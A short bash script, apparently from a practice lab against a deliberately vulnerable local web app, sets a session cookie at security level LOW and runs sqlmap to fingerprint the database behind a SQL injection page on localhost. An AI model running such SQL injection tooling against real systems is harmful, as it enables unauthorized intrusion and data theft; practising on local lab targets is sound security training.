#!/bin/bash

COOKIE="PHPSESSID=dg6hrjugbc9b6jb7eg6vnfjth1; security=LOW"

sqlmap -u "http://localhost:80/vulnerabilities/sqli/index.php?id=1&Submit=Submit" --cookie=$COOKIE -f
